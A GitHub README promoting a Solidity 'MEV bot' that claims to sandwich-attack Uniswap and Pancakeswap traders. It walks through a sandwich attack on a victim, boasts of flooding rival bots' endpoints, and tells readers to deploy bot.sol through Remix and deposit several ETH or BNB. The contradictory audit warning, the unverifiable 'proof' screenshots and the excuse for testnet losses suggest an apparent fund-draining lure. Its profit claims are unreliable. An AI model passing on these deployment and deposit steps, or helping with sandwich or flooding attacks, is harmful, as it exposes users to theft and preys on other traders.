![Uniswap Mevbot](https://github.com/patrickstrong/mevbot/blob/main/mevbot-banner-tutorial.jpeg)

> This contract is not ***UNAUDITED***, so it is recommended to try it on the ***TESTNET*** network first. But you need to know that if you run a contract on the testnet, you can only receive and send ETH from wallet to contract and vice versa without any profit. 
Because the algorithm that the contract uses is only for Mainnet.

# Mevbot Smartcontract for Uniswap (v2/v3) & Pancakeswap (v2/v3) - Monitor the mempool, placing a higher gas fee, extract profit by buying and selling assets before the original transaction takes place. 

The code was never meant to be shown to anybody. My commercial code is better and this was intended to be "tested in production" and a ton of quality tradeoffs have been made. Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.

> Bot sends the Transaction and sniffs the Mempool

> Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity

> Sending back the ETH/BNB and WETH/WBNB to the contract ready for withdrawal.

> This bot performs all of that, faster than 99% of other bots.

### But ser, there are open source bots that do the same

> Yes, there indeed are. Mine was first, tho. And I still outperform them. Reading their articles makes me giggle, as i went through their same pains and from a bot builder to a bot builder, i feel these guys. <3

### Wen increase aggressiveness ?

> As i've spent a year obsessing about this, i have a list of target endpoints that I know other bots use, which i could flood with requests in order to make them lose up to 5 seconds of reaction time and gain an edge over them.

### What did I learn?

> MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Uniswap OR Pancakeswap

### So why stop?

> I've made some profits from this but now using some other better commercial methods, ready to share what I have learnt so devs don't need to go through the same pain.

### Towards the end I kept getting outcompeted by this individual:

> https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e
> https://bscscan.com/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e

If this is you, I'd like to congratulate you on your badassery. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.

### Bot capabilities:

1. Check every Contract pair.
2. Calculate possible profit
3. Automatically submit transaction with higher gas fee than target (in order to get tokens first, low price > seek profit, gas fee included in calculation)
4. Automatically sell tokens with prior gas fee (in order to be the first who sell tokens at higher price)

### What is Sandwich MEV ?

A sandwich attack involves "sandwiching" the victim's transactions between two transactions initiated by the searchers/attackers, whose reordering of the transactions inflicts an implicit loss on the victimized users and possibly benefits the attacker. 

Sandwich MEV exists because the user has to send the intended transactions to the blockchain's mempool, the waiting area for the transactions that haven't been put into a block and need confirmation from the block's miner. 

If the user sets a too-high slippage for the transaction, the searcher could exploit the opportunity by:

- Setting higher gas fees and miner tips for the searcher's first transaction than the victim to make it accepted earlier by the block's miner. 
- Then the searcher would send another transaction with equal or lower gas fees to make sure this transaction is accepted later by the miner than the victim, whose transaction would be squeezed by the attacker's transactions.

How exactly does the attacker gain revenues during the process? Here is an example.

1. In a Uniswap liquidity pool, Bob is a retail investor who wants to trade 1000 $WETH for $USDT. His transaction has been sent to the mempool, making him the victim of a sandwich arbitrage. The transaction is marked as ①  in the figure below. 
2. Unfortunately, Alice, the searcher who has been scanning the mempool, detects Bob's swapping transaction. 
3. Alice makes a transaction of selling 650 $WETH and sends it to the mempool. In the end, she receives 1,842,200 $USDT at the exchange rate of 1 $WETH for 2,834 $USDT. The block's miner accepts this swapping first because Alice pays higher gas fees or miner tips. The swapping causes the exchange rate to change to 1 $WETH for 2,821 $USDT. This transaction and one Alice sent after Bob's are marked as ② in the figure below. 
4. Bob's transaction goes through the mempool and to the block selling 1000 $WETH for 2,821,000 $USDT, which he should have been able to get 2,834,000 $USDT. 
5. Alice's selling of 1,842,200 $USDT passes the mempool and gets recorded by the miner in the block. She receives 652.9 $WETH.  
6. All three transactions are marked as ③ in the figure below, which shows in the order the miner accepts them.

![Mevbot Uniswap](https://1367031751-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FR3c3TlxEVFjceBHqcmyp%2Fuploads%2FQt47bltT4b0YoKiR1B9Y%2Fsandwich.png?alt=media&token=9a26312d-99d4-432d-83e8-46ea67a9b3c8)

Alice's revenue from this Sandwich arbitrage is 2.9 $WETH. The cost is the gas fees and miner tips she gives to the miner for reordering. Assuming it's 1.2 $WETH. In the end, Alice's profit is 1.7 $WETH.

# How to implement Sandwich MEV (MEVBOT) with a smart contract on the Ethereum blockchain ?

1. Access the Solidity Compiler: [Remix IDE](https://remix.ethereum.org)

2. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol".

3. Copy and Paste the code from v1 folder with name bot.sol into Remix IDE.

4. Move to the "Solidity Compiler" tab, select version "0.6.6" or 0.6.12" and then "Compile".

5. Move to the "Deploy" tab, select "Injected Web 3" environment. Connect your Metamask with Remix then "Deploy" it.

6. After the transaction is confirmed, it's your own BOT now.

7. Deposit funds to your exact contract/bot address.

8. After your transaction was confirmed, Start the bot by clicking the “start” button. Withdraw anytime by clicking the “withdrawal” button

I know, this bot only works on the mainnet, but once you can still  deploy on the testnet. and you need to know if this run on testnet and then you call the withdrawal function, it just transfers back your funds without including any profits.

If u want to get priority first for your transaction and get profit from the original transaction, try with 0.5 - 5 ETH or 3 - 10 BNB as contract/bot amount balance. see this contract as reference [jaredfromsubway.eth](https://etherscan.io/address/0x6b75d8af000000e20b7a7ddf000ba900b4009a80#internaltx) this contract use 50 ETH as contract balance to running contract bot.

To withdraw your WETH/WBNB balance from the contract, the contract/bot must have ETH/BNB to pay gas fees.

### Proof By Your Friends

> ![Profit by Sandwich Mev Smartcontract](https://github.com/patrickstrong/mevbot/blob/main/proof-from-your-friends/sandwich-proof.png)
> ![Profit by Sandwich Mev Smartcontract](https://github.com/patrickstrong/mevbot/blob/main/proof-from-your-friends/sandwich-proof-1.png)
